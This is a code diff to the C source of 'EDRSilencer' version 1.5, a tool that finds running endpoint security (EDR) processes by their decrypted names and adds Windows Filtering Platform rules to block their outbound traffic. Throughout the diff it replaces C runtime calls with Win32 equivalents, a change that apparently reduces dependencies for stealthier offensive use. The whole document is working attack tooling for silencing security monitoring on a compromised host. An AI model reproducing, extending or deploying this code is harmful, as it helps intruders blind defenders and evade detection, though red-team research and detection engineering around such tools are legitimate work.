@@ -1,8 +1,3 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <wchar.h>
-
 #include <winsock2.h>
 #include <windows.h>
 #include <fwpmu.h> // For Windows Filtering Platform
@@ -10,12 +5,36 @@
 #include "utils.h"
 #include "process.h"
 
+HANDLE g_hHeap = NULL; // Definition of the global heap handle
+BOOL g_isQuiet = FALSE; // Definition of the quiet mode flag
+
 // Globally unique identifiers (GUIDs) for our WFP provider and sublayer
 const GUID ProviderGUID = { 0x4e27e7d4, 0x2442, 0x4891, { 0x91, 0x2e, 0x42, 0x5, 0x42, 0x8a, 0x85, 0x55 } };
 const GUID SubLayerGUID = { 0x4e27e7d5, 0x2442, 0x4891, { 0x91, 0x2e, 0x42, 0x5, 0x42, 0x8a, 0x85, 0x55 } };
-wchar_t ruleDescription[] = L"Blocks outbound connections for a specific EDR process";
+// REMOVED: wchar_t ruleDescription[] = L"Blocks outbound connections for a specific EDR process";
 
 
+// Custom implementation of strtoull to avoid CRT dependency
+UINT64 CustomStrToULL(const char* str, char** endptr) {
+    UINT64 result = 0;
+    const char* p = str;
+
+    // Skip leading whitespace
+    while (*p == ' ' || *p == '\t') {
+        p++;
+    }
+
+    // Process digits
+    while (*p >= '0' && *p <= '9') {
+        result = result * 10 + (*p - '0');
+        p++;
+    }
+
+    if (endptr) {
+        *endptr = (char*)p;
+    }
+    return result;
+}
 
 
 // Helper function to apply a simple, effective block filter for a given AppID.
@@ -37,8 +56,9 @@ void applyStealthFilters(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPa
     blockFilter.weight.type = FWP_UINT8;
     blockFilter.weight.uint8 = 15; // High weight to ensure it takes precedence
     blockFilter.numFilterConditions = 1;
-    blockFilter.displayData.name = L"EDRSilencer Block Rule";
-    blockFilter.displayData.description = ruleDescription;
+    // UPDATED: Use the new defines from utils.h
+    blockFilter.displayData.name = EDR_FILTER_NAME;
+    blockFilter.displayData.description = EDR_FILTER_DESCRIPTION;
 
     // Define the single condition: match the Application ID
     FWPM_FILTER_CONDITION0 blockCondition = {0};
@@ -125,8 +145,8 @@ void addProcessRule(const char* processPath) {
     }
 
     wchar_t processPathW[MAX_PATH];
-    errno_t err = mbstowcs_s(NULL, processPathW, MAX_PATH, processPath, _TRUNCATE);
-    if (err != 0) {
+    // Replaced mbstowcs_s with MultiByteToWideChar
+    if (MultiByteToWideChar(CP_ACP, 0, processPath, -1, processPathW, MAX_PATH) == 0) {
         EPRINTF("[-] Failed to convert process path or path is too long.\n");
         shutdownWfp(hEngine);
         return;
@@ -152,7 +172,7 @@ void configureNetworkFilters() {
     WCHAR processedPaths[100][MAX_PATH] = {0}; // Track up to 100 unique paths
     int processedCount = 0;
 
-    char** decryptedNames = (char**)malloc(PROCESS_DATA_COUNT * sizeof(char*));
+    char** decryptedNames = (char**)HeapAlloc(g_hHeap, HEAP_ZERO_MEMORY, PROCESS_DATA_COUNT * sizeof(char*));
     if (!decryptedNames) {
         EPRINTF("Memory allocation failed for decrypted names list.\n");
         shutdownWfp(hEngine);
@@ -168,9 +188,9 @@ void configureNetworkFilters() {
         EPRINTF("[-] Failed to create snapshot of processes.\n");
         // Cleanup allocated memory before returning
         for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
-            free(decryptedNames[i]);
+            if (decryptedNames[i]) HeapFree(g_hHeap, 0, decryptedNames[i]);
         }
-        free(decryptedNames);
+        HeapFree(g_hHeap, 0, decryptedNames);
         shutdownWfp(hEngine);
         return;
     }
@@ -180,13 +200,13 @@ void configureNetworkFilters() {
     if (Process32First(hSnapshot, &pe32)) {
         do {
             for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
-                if (decryptedNames[i] && _stricmp(pe32.szExeFile, decryptedNames[i]) == 0) {
+                if (decryptedNames[i] && lstrcmpiA(pe32.szExeFile, decryptedNames[i]) == 0) {
                     PRINTF("[+] Found EDR process: %s\n", pe32.szExeFile);
                     WCHAR fullPath[MAX_PATH];
                     if (getProcessFullPath(pe32.th32ProcessID, fullPath, MAX_PATH)) {
                         BOOL alreadyProcessed = FALSE;
-                        for (int i = 0; i < processedCount; ++i) {
-                            if (_wcsicmp(processedPaths[i], fullPath) == 0) {
+                        for (int j = 0; j < processedCount; ++j) {
+                            if (lstrcmpiW(processedPaths[j], fullPath) == 0) {
                                 alreadyProcessed = TRUE;
                                 break;
                             }
@@ -195,23 +215,28 @@ void configureNetworkFilters() {
                         if (!alreadyProcessed) {
                             applyStealthFilters(hEngine, &SubLayerGUID, fullPath);
                             if (processedCount < 100) {
-                                wcscpy_s(processedPaths[processedCount], MAX_PATH, fullPath);
+                                // wcscpy_s is CRT, use lstrcpyW instead
+                                lstrcpyW(processedPaths[processedCount], fullPath);
                                 processedCount++;
+                            } else {
+                                EWPRINTF(L"    [!] Warning: Processed path limit reached. May not block all subsequent finds.\n");
                             }
                         } else {
                             WPRINTF(L"    [!] Skipping already blocked process path: %s\n", fullPath);
                         }
                     } else {
-                        // Optional: Add a log if getting the path fails for a matched process
                         EPRINTF("    [-] Could not get full path for process: %s\n", pe32.szExeFile);
                     }
-                } else {
-                    // Optional: Add a log if getting the path fails for a matched process
-                    EPRINTF("    [-] Could not get full path for process: %s\n", pe32.szExeFile);
                 }
             }
         } while (Process32Next(hSnapshot, &pe32));
     }
+    
+    // Cleanup allocated memory
+    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
+        if (decryptedNames[i]) HeapFree(g_hHeap, 0, decryptedNames[i]);
+    }
+    HeapFree(g_hHeap, 0, decryptedNames);
 
     CloseHandle(hSnapshot);
     shutdownWfp(hEngine);
@@ -232,21 +257,19 @@ void removeAllRules() {
         return;
     }
 
-    // By deleting the sublayer, all filters within that sublayer are automatically removed.
     result = FwpmSubLayerDeleteByKey0(hEngine, &SubLayerGUID);
     if (result == ERROR_SUCCESS) {
         PRINTF("[+] Sublayer and all associated filters removed successfully.\n");
-        } else if ((long)result == FWP_E_SUBLAYER_NOT_FOUND) {
+    } else if ((long)result == FWP_E_SUBLAYER_NOT_FOUND) {
         EPRINTF("[-] Sublayer not found. No rules to remove.\n");
     } else {
         EPRINTF("[-] FwpmSubLayerDeleteByKey0 failed. Error: 0x%lX\n", result);
     }
 
-    // After removing the sublayer, we can remove the provider.
     result = FwpmProviderDeleteByKey0(hEngine, &ProviderGUID);
     if (result == ERROR_SUCCESS) {
         PRINTF("[+] Provider removed successfully.\n");
-        } else if ((long)result == FWP_E_PROVIDER_NOT_FOUND) {
+    } else if ((long)result == FWP_E_PROVIDER_NOT_FOUND) {
         EPRINTF("[-] Provider not found.\n");
     } else {
         EPRINTF("[-] FwpmProviderDeleteByKey0 failed. Error: 0x%lX\n", result);
@@ -269,7 +292,7 @@ void removeRuleById(UINT64 ruleId) {
     result = FwpmFilterDeleteById0(hEngine, ruleId);
     if (result == ERROR_SUCCESS) {
         PRINTF("[+] Rule with ID %llu removed successfully.\n", ruleId);
-        } else if ((long)result == FWP_E_FILTER_NOT_FOUND) {
+    } else if ((long)result == FWP_E_FILTER_NOT_FOUND) {
         EPRINTF("[-] Rule with ID %llu not found.\n", ruleId);
     } else {
         EPRINTF("[-] Failed to remove rule with ID %llu. Error: 0x%lX\n", ruleId, result);
@@ -282,7 +305,7 @@ void showHelp() {
     PRINTF("Usage: EDRSilencer.exe [--quiet | -q] <command>\n");
     PRINTF("Version: 1.5\n\n");
     PRINTF("Commands:\n");
-     PRINTF("  blockedr    - Add network rules to block traffic of all detected target processes.\n");
+    PRINTF("  blockedr    - Add network rules to block traffic of all detected target processes.\n");
     PRINTF("  add <path>  - Add a network rule to block traffic for a specific process.\n");
     PRINTF("                Example: EDRSilencer.exe add \"C:\\Windows\\System32\\curl.exe\"\n");
     PRINTF("  removeall   - Remove all network rules applied by this tool.\n");
@@ -292,58 +315,75 @@ void showHelp() {
 }
 
 int main(int argc, char *argv[]) {
-    // Parse for --quiet or -q flag before processing other commands
+    g_hHeap = HeapCreate(0, 0, 0);
+    if (g_hHeap == NULL) {
+        // Cannot use EPRINTF here as it relies on the heap for formatting buffer
+        // A direct Win32 call is needed for this specific failure.
+        HANDLE hStdErr = GetStdHandle(STD_ERROR_HANDLE);
+        const char* msg = "[-] Critical error: Failed to create private heap.\n";
+        DWORD written;
+        WriteFile(hStdErr, msg, lstrlenA(msg), &written, NULL);
+        return EXIT_FAILURE_GENERIC;
+    }
+
     for (int i = 1; i < argc; i++) {
-        if (_stricmp(argv[i], "--quiet") == 0 || _stricmp(argv[i], "-q") == 0) {
+        if (lstrcmpiA(argv[i], "--quiet") == 0 || lstrcmpiA(argv[i], "-q") == 0) {
             g_isQuiet = TRUE;
-            // Shift remaining arguments to remove the quiet flag from the list
             for (int j = i; j < argc - 1; j++) {
                 argv[j] = argv[j + 1];
             }
             argc--;
-            i--; // Re-evaluate the current index
+            i--;
         }
     }
     if (argc < 2) {
         showHelp();
+        HeapDestroy(g_hHeap);
         return EXIT_FAILURE_ARGS;
     }
 
-    if (_stricmp(argv[1], "-h") == 0 || _stricmp(argv[1], "--help") == 0) {
+    if (lstrcmpiA(argv[1], "-h") == 0 || lstrcmpiA(argv[1], "--help") == 0) {
         showHelp();
-        return EXIT_SUCCESS;
+        HeapDestroy(g_hHeap);
+        return 0; // EXIT_SUCCESS
     }
     
     if (!CheckProcessIntegrityLevel()) {
+        HeapDestroy(g_hHeap);
         return EXIT_FAILURE_PRIVS;
     }
 
-    if (_stricmp(argv[1], "blockedr") == 0) {
+    if (lstrcmpiA(argv[1], "blockedr") == 0) {
         configureNetworkFilters();
-        } else if (_stricmp(argv[1], "add") == 0) {
+    } else if (lstrcmpiA(argv[1], "add") == 0) {
         if (argc < 3) {
             EPRINTF("[-] Missing argument. Please provide the full path of the process.\n");
+            HeapDestroy(g_hHeap);
             return EXIT_FAILURE_ARGS;
         }
         addProcessRule(argv[2]);
-        } else if (_stricmp(argv[1], "removeall") == 0) {
+    } else if (lstrcmpiA(argv[1], "removeall") == 0) {
         removeAllRules();
-        } else if (_stricmp(argv[1], "remove") == 0) {
+    } else if (lstrcmpiA(argv[1], "remove") == 0) {
         if (argc < 3) {
             EPRINTF("[-] Missing argument. Please provide the rule ID.\n");
+            HeapDestroy(g_hHeap);
             return EXIT_FAILURE_ARGS;
         }
         char *endptr;
-        errno = 0;
-        UINT64 ruleId = strtoull(argv[2], &endptr, 10);
-        if (errno != 0 || endptr == argv[2]) {
+        UINT64 ruleId = CustomStrToULL(argv[2], &endptr);
+        if (endptr == argv[2]) { // No digits were read
             EPRINTF("[-] Invalid rule ID provided.\n");
+            HeapDestroy(g_hHeap);
             return EXIT_FAILURE_ARGS;
         }
         removeRuleById(ruleId);
     } else {
         EPRINTF("[-] Invalid command: \"%s\". Use -h for help.\n", argv[1]);
+        HeapDestroy(g_hHeap);
         return EXIT_FAILURE_ARGS;
     }
-    return EXIT_SUCCESS;
+
+    HeapDestroy(g_hHeap);
+    return 0; // EXIT_SUCCESS
 }
